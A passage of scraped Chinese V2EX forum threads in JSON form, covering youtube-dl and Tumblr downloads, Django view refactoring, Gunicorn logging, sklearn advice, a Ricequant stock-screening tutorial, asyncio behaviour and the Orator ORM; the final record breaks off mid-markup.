{"content": ["<div class=\"topic_content\">在 github 上下载的最新的 exe ，在 windows 里 cmd 运行后，打印出来这样：\r<br>\r<br>WARNING: Falling back on generic information extractor.\r<br>[generic] 目标地址.tumblr: Downloading webpage\r<br>[generic] 目标地址.tumblr: Extracting information\r<br>ERROR: Unsupported URL: http://目标地址.tumblr.com/\r<br>\r<br>已经全局爬梯子了，浏览器中可以顺利浏览目标网站\r<br>求解－－，或者更好的批量爬虫工具， v2 上看到有同学写了批量爬虫\r<br>可是小白用户不知道咋用，谁要能出个教程也行。。。</div>"], "reply": "44", "tittle": "为什么 youtube－ dl 下载 tumblr 时不支持了，提示 Unsupported URL", "comment": ["兄弟，注意身体", "我可以帮你撸一个，不过要等我闲了。。  还是注意身体的好", "回复笑尿", "ls 路过了 3 位老司机。。。", " 已经有 v 友写了－－，见此帖： ", "\r", "求帮忙封装成傻瓜工具，，，最好支持导出下载地址列表，因为用迅雷下着更快哈 ", "   ", " ", "youtube-dl 只支持单个视频下载吧，这是匹配 Url 的正则\r", "https?://(?P<blog_name>[^/?#&]+)\\.tumblr\\.com/(?:post|video)/(?P<id>[0-9]+)(?:$|[/?#])\r", "\r", "可以试试这个: ", "我也一样， youtube-dl 竟然不支持 Tumblr 了！！！！\r", " 我跟楼主情况一样，以前好好的，现在不行了，而且本身就是下载一个视频而不是一堆，但同样不支持。", "you-get", "楼主记得买营养快线", " \r", " \r", "更新下?", "tumblr 的客户端比 web 好用多了", "农民工表示营养跟不上。。", " 我理解，但是我的确实用不了，而且已经是最新版。（下面这个竟然是 301 错误，平时是跟楼主一样的提示）\r", "\r", "```\r", "➜  ~ youtube-dl --version\r", "2016.11.22\r", "➜  ~ youtube-dl ", " jj 好大\r", "[Tumblr] 144036016305: Downloading webpage\r", "ERROR: Unable to download webpage: HTTP Error 301: The HTTP server returned a redirect error that would lead to an infinite loop.\r", "The last 30x error message was:\r", "Moved Permanently (caused by <HTTPError 301: 'The HTTP server returned a redirect error that would lead to an infinite loop.\\nThe last 30x error message was:\\nMoved Permanently'>); please report this issue on ", " . Make sure you are using the latest version; type  youtube-dl -U  to update. Be sure to call youtube-dl with the --verbose flag and include its complete output.\r", "➜  ~\r", "\r", "```", "前排出售营养块钱", "各位都在开车哈哈哈", "  ", "  我是刚从 github 上下载的，不过是 exe 包，下载是报这个错，以前都是好好的呢 ", " ", "注意身体", " 滴,老人卡", "老司机开车了", "请遵守交通规则，注意行车安全", " 你的这个可以下载。", "正确的姿势不是应该结合 ifttt 或 zapier ，标记 like 后自动下载到 dropbox 么？", "貌似汤升级了？以前火狐安卓版长按可下载 html 文件的改个后缀就行了，现在下载不了了……", " 迅雷本身本身就可以批量解析下载地址的", "用 Video Downloader professional", " 所以我说可能是系统问题我以前都可以用，现在都不行，和楼主一样的情况。而且还能出 301 错误。", "可以下载啊，你的梯子断流问题，不是 youtube-dl 的问题。\r", "你试试挂梯子能不能打开那个连接。", "自己撸了个 4chan.py gif 9629239  这样下载的工具，蛮好用的", "前排出售卫生巾", "出售营养快线、纸巾、肾宝片、六味地黄丸", " 大兄弟，这是我写的，本来就支持写出下载链接", " 可是我是小白用户。。。求傻瓜上手教程。。。", "营养都跟不上了", " 迅雷的现在也不能用了啊", "楼上一群是真正的老司机啊，连车都是自家造的。", "迅雷直接可以下啊 .", " 现在不行了啊 我都拨通 vpn 了，解析结果一直不出来", "都是老司机啊", "tumblr 的 macOS 版客户端，貌似在 MAS 国区不提供？", " 大家讨论的是批量下载。。。输入博主 url ，直接下载博主的所有视频。。。", "所以 LZ 就在 V2 骂了半天 底下人装模作样解决了半天。\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "\r", "你倒是开个 issue 去啊 你不开 issue 维护者怎么知道不好使了", "给你专门写了个帖子参考一下:  怎样下载 汤不热 Tumblr 视频 – 几种靠谱的方法  ", "tumblr 难道不是直接右键另存为吗？"]},
{"content": ["<div class=\"topic_content\">Python3 ，个人或小团队创作那些\r<br>像 numpy 这些有名的就不需要了\r<br>\r<br>很多个人作品很简单方便高效，但 pypi 或 git 上面只会写如何安装或使用方法，未用过还真不知道</div>"], "reply": "2", "tittle": "有没有什么网站专门介绍各种模块的", "comment": ["git readme 真的会写的好好的，除非作者根本就不想让大家用。", " \r", "我需要知道的是有什么用，而不是怎么用\r", "\r", "我知道用钥匙开门，但门后面有什么，该开哪个门，却是我不知道的\r", "\r", "像这个 ", " （帮他打个广告），现在已经是我必装软件之一\r", "但当初，在 git 看 readme 只是写了怎么安装，以为和其他 dns 工具差不多，但后来在一个被墙的海外网站看到介绍，才知道这货功能是多么强大，至少完全满足我的需求"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>中间一大波重复的，有办法精简吗？</p>\n<pre><code>def index(request):\n    return HttpResponse(\"hello world\")\n\n#软件页面\ndef software(request):\n    soft=SoftWare.objects.all()\n    content = {'soft':soft}\n    return render(request,'soft_index.html',content)\n\n#软件内容页面\ndef software_detail(request,software_id):\n    soft= SoftWare.objects.get(id=str(software_id))\n    content = {'soft':soft}\n    return render(request,'soft_detail.html',content)\n\n#博客首页\ndef blog(request):\n    post = Article.objects.all()\n    content ={'post':post}\n    return render(request,'blog_index.html',content)\n\n#博客内容页面\ndef blog_detail(request,blog_id):\n    post= Article.objects.get(id=str(blog_id))\n    content = {'post':post}\n    return render(request,'blog_detail.html',content)\n\n#脚本首页\ndef bash(request):\n    bash = Bash.objects.all()\n    content ={'bash':bash}\n    return render(request,'bash_index.html',content)\n\n#脚本内容页面\ndef bash_detail(request,blog_id):\n    bash= Article.objects.get(id=str(blog_id))\n    content = {'bash':bash}\n    return render(request,'bash_detail.html',content)\n\n#视频首页\ndef video(request):\n    post = Video.objects.all()\n    content ={'video':video}\n    return render(request,'video_index.html',content)\n\n#视频内容页面\ndef video_detail(request,blog_id):\n    post= Video.objects.get(id=str(blog_id))\n    content = {'video':video}\n    return render(request,'video_detail.html',content)\n</code></pre>\n</div></div>"], "reply": "16", "tittle": "Python 老司机带我开开车", "comment": ["software_id 和 blog_id 可以设默认值，然后方法里判断下", " 非常感谢！", " 开始以为搞懂了，发现又没懂了，能详细指导一下吗？", "意思就是将 software_id 和 blog_id 可以区别开", "def page_factory(pagename, obj, template):\r", "---- return lambda request: render(request, template, { pagename: obj.all() }\r", "\r", "video = page_factory( 'video', Video.objects, 'video_index.html')\r", "bash = page_factory( 'bash', Bash.objects, 'bash_index.html')", "你可以用 mixin", "这样写 view 也没啥问题啊，只要性能不差，维护方便就好", " 像这个，就是典型的不可维护的代码，只关注炫技，完全不关注业务的内在联系", "不需要精简", "没什么好办法。\r", "\r", "我个人想法是，你非要简化的话可以用类来包装一下，然后用 override 实现多态。", "看上去这些 view 并没有什么真正的业务逻辑，都是 model 驱动的普通的 CRUD ，这样的情况直接用 Django 的 generic views 就行不需要自己写 view 内容。", "不需要的吧。。", "generic views + 1", "不需要精简，不然改动的时候你就知道烦了。", "def fun(selector):\r", "----'''selector 是 str 类型标识符\r", "----dict_func = {selector : func, ... ...} \r", "----dict_page = {selector : page, ... ...} \r", "----content = {selector : SoftWare.objects.dict[selector]() }\r", "----return render(request, dict_page[selctor], content)\r", "\r", "其他函数直接向 func 传递 selector 标识符就可以了", "写的挺好的，改了反而难以读懂"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"/i/iq3yXW9L.png\" title=\"在新窗口打开图片 iq3yXW9L.png\"><img src=\"//i.v2ex.co/iq3yXW9L.png\" class=\"embedded_image\"></a></div>"], "reply": "目前尚无回", "tittle": "谁用过 pyspider 做爬虫？我感觉挺好用的，谁发了有问题不？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我的 flask 项目使用 logging 模块,使用 TimedRotatingFileHandler,然后 gunicorn 开了 32 个进程.</p>\n<p>logging 模块不是进程安全的,这个 logging 模块的官网有写</p>\n<p>Because there is no standard way to serialize access to a single file across multiple processes in Python. If you need to log to a single file from multiple processes, one way of doing this is to have all the processes log to a SocketHandler, and have a separate process which implements a socket server which reads from the socket and logs to file. (If you prefer, you can dedicate one thread in one of the existing processes to perform this function.)</p>\n<p>但是我的项目跑了半年,从来没有看到日志错乱的情况,每一条都清清楚楚..</p>\n<p>Google 了下,搜到了一个 gunicorn 的 issue:<a href=\"https://github.com/benoitc/gunicorn/issues/1272\" rel=\"nofollow\">https://github.com/benoitc/gunicorn/issues/1272</a></p>\n<p>但是看完了这个 issue 表示还是云里雾里没懂,gunicorn 作者给的解释如下</p>\n<p>The fd is shared between all workers, and until it isn't over the limit (depending on your system) alls logs will go over it.</p>\n<p>求详细解释,谢谢</p>\n</div></div>", "<div class=\"topic_content\">多谢,这样理解对吧\r<br>多进程共用一个 fd 的情况下使用 logging 模块写少量日志是进程安全的\r<br><a target=\"_blank\" href=\"http://www.birdcat.cn/linux%E4%B8%8Ac%E7%BC%96%E7%A8%8B/Linux%E4%B8%8B%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%97%B6%E5%86%99%E5%90%8C%E4%B8%80%E6%96%87%E4%BB%B6%EF%BC%8C%E8%A6%81%E4%B8%8D%E8%A6%81%E5%8A%A0%E9%94%81.html\" rel=\"nofollow\">http://www.birdcat.cn/linux%E4%B8%8Ac%E7%BC%96%E7%A8%8B/Linux%E4%B8%8B%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%97%B6%E5%86%99%E5%90%8C%E4%B8%80%E6%96%87%E4%BB%B6%EF%BC%8C%E8%A6%81%E4%B8%8D%E8%A6%81%E5%8A%A0%E9%94%81.html</a></div>"], "reply": "3", "tittle": "多进程 Gunicorn 的日志为什么不会错乱?", "comment": ["因为子进程共享了父进程的文件句柄", "Linux 有个特性，你使用  APPEND 方式打开文件句柄，每次写入的量小于 PIPE_BUF_MAX ，那么系统能保证多进程之间不冲突", "因为 linux 控制台保证了输出的进程安全"]},
{"content": ["<div class=\"topic_content\">本文以 Andrew Ng 的《 Advice for applying Machine Learning 》为基础进行拓展。\r<br>克隆 Notebook\r<br>本文以 Bremen 大学机器学习课程的教程为基础的。总结了使用机器学习解决新问题的一些建议。包括：\r<br>可视化数据的方法\r<br>选择一个适合当前问题的机器学习方法\r<br>鉴别和解决过拟合和欠拟合问题\r<br>处理大数据库问题（注意：不是非常小的）\r<br>不同损失函数的利弊\r<br>本文以 Andrew Ng 的《 Advice for applying Machine Learning 》为基础。\r<br>这个笔记的目的是用一个互动的方法解释这些观点。有些建议是可以讨论的。它们仅是建议，不是严格的规则。\r<br>翻译参考来自 <a target=\"_blank\" href=\"http://blog.jobbole.com/85680/\" rel=\"nofollow\">http://blog.jobbole.com/85680/</a>\r<br>\r<br>数据集\r<br>我们使用 sklearn 的 make_classification 函数来生成一些简单的玩具数据：\r<br>\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/N71YB7nzl.png\" title=\"在新窗口打开图片 N71YB7nzl.png\"><img src=\"//i.v2ex.co/N71YB7nzl.png\" class=\"embedded_image\"></a>\r<br>\r<br>注意到我们为二分类生成了一个数据集，这个数据集包括 1000 个数据点，每个特征 20 维。我们已经使用 pandas 的 DataFrame 类把数据和类别封装到一个共同的数据结构中。我们来看一看前 5 个数据点：\r<br>\r<br><a target=\"_blank\" href=\"/i/1erpHK8Vl.png\" title=\"在新窗口打开图片 1erpHK8Vl.png\"><img src=\"//i.v2ex.co/1erpHK8Vl.png\" class=\"embedded_image\"></a>\r<br>\r<br>通过直接查看原始特征值，我们很难获得该问题的任何线索，即使在这个低维的例子中。因此，有很多的提供数据的更容易视图的方法；其中的小部分将在接下来的部分中讨论。\r<br>可视化\r<br>当你接到一个新的问题，第一步几乎都是可视化，也就是说，观察你的数据。\r<br>Seaborn 是一个不错的统计数据可视化包。我们使用它的一些函数来探索数据。\r<br>第一步是使用 pairplot 生成散点图和直方图。两种颜色对应了两个类别，我们使用了特征的一个子集、仅仅使用前 50 个数据点来简化问题。\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/rYpve3c1l.png\" title=\"在新窗口打开图片 rYpve3c1l.png\"><img src=\"//i.v2ex.co/rYpve3c1l.png\" class=\"embedded_image\"></a>\r<br>\r<br>基于该直方图，我们可以看到一些特征比其他特征对分类更有用。特别地，特征 11 和 14 看起来有丰富的信息量。这两个特征的散点图显示类别在二维空间中几乎是线性可分的。要更加注意的是，特征 12 和 19 是高度负相关的。我们可以通过使用 corrplot 更系统地探索相关性：\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/x9rYI7Vsl.png\" title=\"在新窗口打开图片 x9rYI7Vsl.png\"><img src=\"//i.v2ex.co/x9rYI7Vsl.png\" class=\"embedded_image\"></a>\r<br>\r<br>我们可以发现之前的观察结果在这里得到了确认：特征 11 和 14 与类强相关（他们有丰富的信息量）。更进一步，特征 12 和特征 19 强负相关，特征 19 和特征 14 强相关。因此，有一些特征是冗余的。这对于有些分类器可能会出现问题，比如，朴素贝叶斯，它假设所有的特征都是独立的。剩下的特征大部分都是噪声，他们既不相互关联，也不和类别相关。\r<br>注意到如果特征维数较大、数据点较少的时候，数据可视化会变得更有挑战性。\r<br>方法的选择\r<br>一旦我们已经使用可视化方法对数据进行了探索，我们就可以开始应用机器学习了。机器学习方法数量众多，通常很难决定先尝试哪种方法。这个简单的备忘单（归功于 Andreas Müller 和 sklearn 团队）可以帮助你为你的问题选择一个合适的机器学习方法（供选择的备忘录见 <a target=\"_blank\" href=\"http://dlib.net/ml_guide.svg\" rel=\"nofollow\">http://dlib.net/ml_guide.svg</a> ）\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/k1G3ZRD9l.png\" title=\"在新窗口打开图片 k1G3ZRD9l.png\"><img src=\"//i.v2ex.co/k1G3ZRD9l.png\" class=\"embedded_image\"></a>\r<br>\r<br>我们有了 1000 个样本，要预测一个类别，并且有了标签，那么备忘单推荐我们首先使用 LinearSVC （ LinearSVC 代表线性核的支持向量分类，并且对于这类特殊问题使用一个有效的算法）。所有我们做了个试验。 LinearSVC 需要选择正则化；我们使用标准 L2 范数惩罚和 C=10.我们分别画出训练分数和验证分数的学习曲线（这个例子中分数代表准确率）：\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/rcU35qx6l.png\" title=\"在新窗口打开图片 rcU35qx6l.png\"><img src=\"//i.v2ex.co/rcU35qx6l.png\" class=\"embedded_image\"></a>\r<br>\r<br>我们可以注意到训练数据和交叉验证数据的错误率有很大的差距。这意味什么？我们可能过度拟合训练数据了！\r<br>解决过拟合\r<br>有很多方法来减少过拟合：\r<br>增加训练样本数\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/H2jDOb97l.png\" title=\"在新窗口打开图片 H2jDOb97l.png\"><img src=\"//i.v2ex.co/H2jDOb97l.png\" class=\"embedded_image\"></a>\r<br>\r<br>可以看到当训练数据增加时，验证分数越来越大，差距越来越小；因此现在不再过拟合了。有很多获得更多数据的方法，比如（ a ）可以尽力投资收集更多数据，（ b ）基于现有数据创造一些人为的数据（比如图像旋转，平移，扭曲），或者（ c ）加入人工噪声。如果以上的这些方法都不可行，就不可能获得更多的数据，我们或者可以\r<br>减少特征的维数 （从我们可视化中可以知道，特征 11 和 14 是信息量最大的）\r<br>\r<br>\r<br><a target=\"_blank\" href=\"/i/36P6Y43Bl.png\" title=\"在新窗口打开图片 36P6Y43Bl.png\"><img src=\"//i.v2ex.co/36P6Y43Bl.png\" class=\"embedded_image\"></a>\r<br>\r<br>注意到，因为我们是手动的挑选特征，而且在比我们给分类器更多的数据上，这有一点作弊的意味。我们可以使用自动挑选特征：\r<br>\r<br>因为雪球篇幅字数有限，所以就先转载到这儿了，余下内容请移步 <a target=\"_blank\" href=\"https://uqer.io/community/share/58117520228e5b1627bc555d\" rel=\"nofollow\">https://uqer.io/community/share/58117520228e5b1627bc555d</a> ，作者：量化投资与机器学习</div>"], "reply": "11", "tittle": "[sklearn 机器学习] ——应用机器学习的建议", "comment": ["楼主考虑新工作嘛？机器学习", "谢谢分享, 如果数据量大, 如何效率的调参数, 如何效率的调整特征呢? 由于每次训练会耗时过久, 有应付的方法吗?", "谢谢分享 为啥不用 Scala 呢 看着满满的 py .", "要是赢 py 似乎有个 pyldavis 要是 可视化 感觉还是 zeppelin 好玩点儿 毕竟是 df 嘛", "如果依照 V2EX 的约定的话，转载只要转链接就 ok 了", " 这是广告文，当然要转的像模像样。这人和 V2 有 PY 交易，以前发的每次量化交易的垃圾文章都置顶了", " 谁都可以置顶的 充个 4.99 就行", "想知道 sklearn 对 tensorflow 有什么优势？ 小米加步枪对大炮", " 普通问题用 sklearn 就很好了~ 如果你普通的机器学习算法搞不定再考虑深度学习。\r", "深度学习对数据量以及计算能力都有不低的要求", " sklearn 打包了常用的机器学习算法，适合快速实验。。 TensorFlow 是基于符号运算的库，基本上为深度学习打造。。", "又是软文广告贴"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3><strong>伟大的资源来自 <a href=\"https://www.ricequant.com/community/topic/815/?utm_source=v2ex\" rel=\"nofollow\">https://www.ricequant.com/community/topic/815/?utm_source=v2ex</a></strong></h3>\n<p>我们提供了较为丰富的入门教学材料和视频，可能您还是会有疑问如何开始呢？我们就从一个简单的例子开始来看看吧，是非常流行的神奇公式</p>\n<p>我最开始是在网上浏览看到这个公式的，那么其作者是格林布拉特：</p>\n<p>乔尔•格林布拉特简介\nGotham 资本公司的创始人和合伙经理人，自 1985 年这一私人投资公司成立以来，它的年均回报率达到了 40%。他不仅是哥伦比亚大学商学院的客座教授，一家《财富》 500 强公司的前董事长，价值投资者俱乐部网站（ <a href=\"http://ValueInvestorsClub.com\" rel=\"nofollow\">ValueInvestorsClub.com</a> ）的合作发起人，还是《你能成为股市天才》一书的作者。格林布拉特拥有理学学士学位，并从沃顿学院获得工商管理硕士学位。</p>\n<p>[《证券市场周刊》记者王存迎]\n乔尔·格林布拉特的投资理念是要找到物美价廉的公司，特别是在市场出现特殊情况的背景下低价买入好业务。\n　　\n“便宜价格买好业务是神奇公式的核心理念。神奇公式能够帮助不懂估值的投资人战胜大盘，而对于精通估值的投资人，神奇公式则能给他们提供一个起点，他们的估值能力还能给神奇公式加分。”他如此评价他自己发明的神奇公式，认为神奇公式是戈坦资本投资流程的简化版。\n　　\n在《股市稳赢》一书中，格林布拉特详细介绍了神奇公式的应用方法。其具体操作流程可以简化成两部分：一是寻找好的业务；二是寻找便宜的股票。好的业务是指有形资本回报率高的公司；便宜的股票则是指息税前盈余 /企业价值（ EBIT/ EV ）高的股票。</p>\n<p>利用神奇公式，在美国的历史回溯检验数据显示， 1988 年至 2004 年这 17 年间，该策略的年复合回报率为 30.8%，而同期标准普尔 500 指数的年复合回报率仅为 12.4%。</p>\n<p>接着我们开始找这个公式的真正原版是什么吧！经过一系列的 google 之后我还是比较相信 wikipedia ： <a href=\"https://en.wikipedia.org/wiki/Magic_formula_investing\" rel=\"nofollow\">https://en.wikipedia.org/wiki/Magic_formula_investing</a></p>\n<p>Methodology[edit]</p>\n<p>Greenblatt suggests purchasing 30 \"good companies\": cheap stocks with a high earnings yield and a high return on capital. He touts the success of his magic formula in his book 'The Little Book that Beats the Market ', Joel Greenblatt ISBN 0-471-73306-7, citing that it does in fact beat the S&amp;P 500 96% of the time, and has averaged a 17-year annual return of 30.8%[1]</p>\n<p>Formula[edit]</p>\n<p>Establish a minimum market capitalization (usually greater than $50 million).\nExclude utility and financial stocks.\nExclude foreign companies (American Depositary Receipts).\nDetermine company's earnings yield = EBIT / enterprise value.\nDetermine company's return on capital = EBIT / (net fixed assets + working capital).\nRank all companies above chosen market capitalization by highest earnings yield and highest return on capital (ranked as percentages).\nInvest in 20 – 30 highest ranked companies, accumulating 2 – 3 positions per month over a 12-month period.\nRe-balance portfolio once per year, selling losers one week before the year-mark and winners one week after the year mark.\nContinue over a long-term (5 – 10+ year) period.\n翻译一下就是：</p>\n<p>排除掉公共事业和金融板块的股票。（为什么呢？这个可能需要从作者的那本书名很俗的书中寻找）\n排除掉境外的公司（ A 股基本没有）\n选取公司的息税前盈余 /企业价值高的 = EBIT / Enterprise Value 《---- 便宜的股票是指税前盈余 /企业价值（ EBIT/EV ）高的股票。\n选取公司的有形资本回报率（ return on capital ）= EBIT / (Net Fixed Assets + Working Capital) &lt;--- 好的业务是指有形资本回报率高的公司\n从所有市面上的股票中选取 3 和 4 最高的公司的股票\n投资 20-30 个排名最高的股票，然后每个月持续加入 2-3 个持仓直到超过 12 个月\n每年进行重新调整投资组合，年前剔除掉当年投资比较失败的，年后剔除掉当年投资比较成功的\n长期继续以上的操作（ 5-10 年+）\n在整个公式分析中如何一步一步在 Ricequant 上实现呢？我们先从比较简单的版本做起，剔除掉 6-8 的复杂操作，假设每个月调仓投资 20-30 个符合 3-4 点的股票。</p>\n<p><strong>1.1 排除掉公共事业和金融板块的股票。</strong></p>\n<p>这个需要使用 Ricequant 提供的板块功能： <a href=\"https://www.ricequant.com/api/python/chn#other-methods-sector\" rel=\"nofollow\">https://www.ricequant.com/api/python/chn#other-methods-sector</a></p>\n<pre><code>context.utlility_and_fin_stocks = sector('utilities') + sector('financials')\nlogger.info(context.utlility_and_fin_stocks)\n</code></pre>\n<p>我们使用 sector 拿到 utilities 和 financials 两个板块的股票，然后返回的是两个 array 相加得到一个包含两个板块的 array ，我也会习惯打印一句 <a href=\"http://logger.info\" rel=\"nofollow\">logger.info</a>(xx)来把我们拿到的这俩板块的股票列表显示出来。</p>\n<p><strong>2. 选取公司的息税前盈余 /企业价值高的 = EBIT / Enterprise Value 《---- 便宜的股票是指税前盈余 /企业价值（ EBIT/EV ）高的股票。</strong></p>\n<p>比较赞的是 Ricequant 提供的财务数据表格查询是非常齐全和清洗的，也包含了专业的英文命名： <a href=\"https://www.ricequant.com/fundamentals\" rel=\"nofollow\">https://www.ricequant.com/fundamentals</a></p>\n<p>我们需要首先寻找到 EBIT 和 Enterprise value （ EV ）在 Ricequant 的命名：\n<img alt=\"\" src=\"http://p1.bqimg.com/567571/ced0095ba104d03a.png\"></p>\n<p>比较有意思的是我们直接找到了 EV/EBIT ，但是我们需要寻找的是 EBIT/EV 的最高的几名，因此从 EV/EBIT 这个指标我们只需要的排序是从低到高的前几名即可，那么转化为查询代码（对查询财务数据不熟悉，可以看我们的财务数据教程和视频）：</p>\n<p>我们首先要提前考虑的是我们需要查询两个指标： EBIT/EV 和资本回报率（ return on capital ）, 分别会拿到两组的公司列表，然后找两个列表中的共同股票就是最后的所得，由于财务数据的查询量会比较大，我们做一个 200 的查询限制，先查 EV/EBIT 的从低到高的排序：</p>\n<pre><code>context.limit = 200\nebit_div_ev_df = get_fundamentals(\n        query(\n            fundamentals.eod_derivative_indicator.ev_to_ebit\n        ).order_by(\n            fundamentals.eod_derivative_indicator.ev_to_ebit.asc()\n        ).limit(\n            context.limit\n        )\n    )\n</code></pre>\n<p>PS:</p>\n<p>1.1 这里有个命名的建议是，所有的 dataframe 数据类型我都建议您使用_df 作为结尾，这样看到这个变量名，您就可以知道他是 dataframe 的数据类型了。\n2.2fundamentals.eod_derivative_indicator.ev_to_ebit 就是我们在财务数据字典中查到的指标名。\n3.3order_by(fundamentals.eod_derivative_indicator.ev_to_ebit.asc())是对该指标进行一个从小到大的排序，然后选取前 context.limit 个 - 即前 200 个</p>\n<p><strong>3. 接着我们开始查询资本回报率（ return on capital ），幸运的是我们强大的财务数据字典依然有：</strong></p>\n<p><img alt=\"\" src=\"http://p1.bpimg.com/567571/03dc65b6b2ad4d1e.png\"></p>\n<p>那么我们开始构建资本回报率的财务数据查询:</p>\n<pre><code>return_on_cap_df = get_fundamentals(\n        query(\n            fundamentals.financial_indicator.return_on_invested_capital\n        ).order_by(\n            fundamentals.financial_indicator.return_on_invested_capital.desc()\n        ).limit(\n            context.limit\n        )\n    )\n</code></pre>\n<p>那么此时我们拿到了两个 dataframe 分别是 ebit_div_ev_df 和 return_on_cap_df ，但是我们要拿的是在这两个 df 中都存在的股票，因此做以下的代码操作：</p>\n<pre><code>df_stocks = [stock for stock in ebit_div_ev_df if stock in return_on_cap_df]\n</code></pre>\n<p>但是我们仍旧需要去除掉属于公共事业和金融板块的股票代码：</p>\n<pre><code>for stock in df_stocks:\n    if stock in context.utlility_and_fin_stocks:\n        df_stocks.remove(stock)\n</code></pre>\n<p>我们只需要前 30 个即可：</p>\n<pre><code>context.total_amount = 30\ncontext.stocks = df_stocks[0:context.total_amount]\nlogger.info(\"选择好的神奇公式股票列表为：\" + str(context.stocks))\n</code></pre>\n<p>那么 context.stocks 就是最终我们需要的符合神奇公式的股票列表啦！</p>\n<h3><strong>伟大的资源来自 <a href=\"https://www.ricequant.com/community/topic/815/?utm_source=v2ex\" rel=\"nofollow\">https://www.ricequant.com/community/topic/815/?utm_source=v2ex</a></strong></h3>\n</div></div>"], "reply": "目前尚无回", "tittle": "[神奇公式] 如何在 Ricequant 上实现策略 - 1 从别人的经验和思路中实现策略", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>import logging; logging.basicConfig(level=logging.INFO)\n\nimport asyncio, os, json, time\nfrom datetime import datetime\n\nfrom aiohttp import web\n\ndef index(request):\n    logging.info('server response...')\n    return web.Response(body=b'&lt;h1&gt;Awesome&lt;/h1&gt;')\n\nasync def init(loop):\n    app = web.Application(loop=loop)\n    app.router.add_route('GET', '/', index)\n    logging.info('server before...')\n    srv = await loop.create_server(app.make_handler(), '127.0.0.1', 9000)\n    logging.info('server started at http://127.0.0.1:9000...')\n    return srv\n\nloop = asyncio.get_event_loop()\nloop.run_until_complete(init(loop))\nloop.run_forever()\n</code></pre>\n<p>我觉得运行的日志：</p>\n<pre><code>INFO:root:server before...\nINFO:root:server response...\nINFO:root:server started at http://127.0.0.1:9000...\n</code></pre>\n<p>结果正确的日志是：</p>\n<pre><code>INFO:root:server before...\nINFO:root:server started at http://127.0.0.1:9000...\nINFO:root:server response...\n</code></pre>\n<p>在我的理解里， python 执行到 await 应该暂停执行函数， TCP 协程结束后，才执行 server started at...这条日志。怎么函数一下子全部执行完了。</p>\n</div></div>"], "reply": "14", "tittle": "初学 python,大家帮忙看看这段协程代码，运行结果想了半天还没想通", "comment": ["因为你的 init 函数没有用 await init 调用", "async def init(loop): \r", "\r", "学艺不精 看不懂-_-||", " ", "\r", "这是 python 的官方示例。这个例子调用的时候也没有 await 调用呀\r", "```\r", "import asyncio\r", "\r", "async def compute(x, y):\r", "    print(\"Compute %s + %s ...\" % (x, y))\r", "    await asyncio.sleep(1.0)\r", "    return x + y\r", "\r", "async def print_sum(x, y):\r", "    result = await compute(x, y)\r", "    print(\"%s + %s = %s\" % (x, y, result))\r", "\r", "loop = asyncio.get_event_loop()\r", "loop.run_until_complete(print_sum(1, 2))\r", "loop.close()\r", "```", "没错啊， create_server 只是 bing 了没有 listen 啊，所以立刻返回了， run_forever 才进行 listen 的行为", " 我也不懂，纠结中", "没错啊， create_server 只是 bind 了没有 listen 啊，所以立刻返回了， run_forever 才进行 listen 的行为", " 你的 init 返回的是一个 future ，直接 init() 会当做普通函数来执行", "loop.create_server 是创建一个服务器对象， await loop.create_server(...)是等待创建这个服务器对象，并不是等待这个服务器响应请求。", "await 的语义相当于 yield from(首先你得先搞清楚这个东西), 不要和 yield 这个鬼搞混淆了, 出现 async 和 await 支持的原因本就是为了使用写同步代码的方式写出异步的效果.在你这里, 正常逻辑考虑, 你的 server 都还没有创建, 怎么可能请求成功, 从而执行 index 函数.建议 debug 追踪下代码内部的执行逻辑,要熟悉其内部原理, 最好看一下 asyncio 的源码, 自己实现一下", " \r", " \r", " \r", "谢谢大家，有点儿明白了。", " 感觉 yield from 和 yield 没什么大区别。谢谢，我去读读源码", " 你的说法是有问题的, run_forever 并不是进行 server 的 listen 的行为,而是执行了一段类似与下面的代码\r", "while not self.stopped:\r", "            events = selector.select(self.select_timeout)\r", "            if not events:\r", "                raise Exception('轮询超时')\r", "            for event_key, event_mask in events:\r", "                callback = event_key.data\r", "                callback(event_key, event_mask)\r", "用来取出可读可写等事件, 其实就是通过事件循环驱动(通知)阻塞程序恢复执行", " listen 做的事情也是这样的啊，有什么区别么", "没什么问题啊， win7 64 位 python 3.5.2"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://orator-orm.com/\" rel=\"nofollow\">官网 orator-orm.com</a></p>\n<p>一个偏工程的项目， ORM 还是挺重要的，但是。。</p>\n<ul>\n<li>当你用 Django 的 ORM 时候是不是有各种不爽呢？</li>\n<li>当你用 Flask+SQLAlchemy 的时候会不会觉得头重脚轻呢？</li>\n<li>当你看到 Pony 眼前一亮的时候，发现作者非常急着变现，会不会担心社区呢？</li>\n</ul>\n<p>Orator 有啥买点呢？</p>\n<ul>\n<li>ActiveRecord （成功案例： Rails ， Laravel ）</li>\n<li>少有的注重官网设计感的 py 框架，读文档心情好（不过人家也承认 inspired by Laravel ，估计官网也是）</li>\n<li>自带完善的 Migrations 等支持工具链</li>\n</ul>\n<hr>\n<p>现在问题来了，想请教下大家：常见的几个 py 的 web 框架下，是否有带来比较好的<strong>服务器端前端工程化</strong>思路的 library ？</p>\n<ul>\n<li>个人觉得这是 py 框架的另一个问题，你看 Rails 几年前就有 Turbolinks ，而且现在 <a href=\"https://www.youtube.com/watch?v=SWEts0rlezA\" rel=\"nofollow\">有焕发第二春的可能</a></li>\n<li>当然我们也可以用 Webpack 之类的打包，前后端分离，但是参考 JS in 2016 。。 train一个可单兵作战的全栈出来会花很多不必要的时间</li>\n</ul>\n<p>先谢啦 :)</p>\n</div></div>", "<div class=\"topic_content\"><div 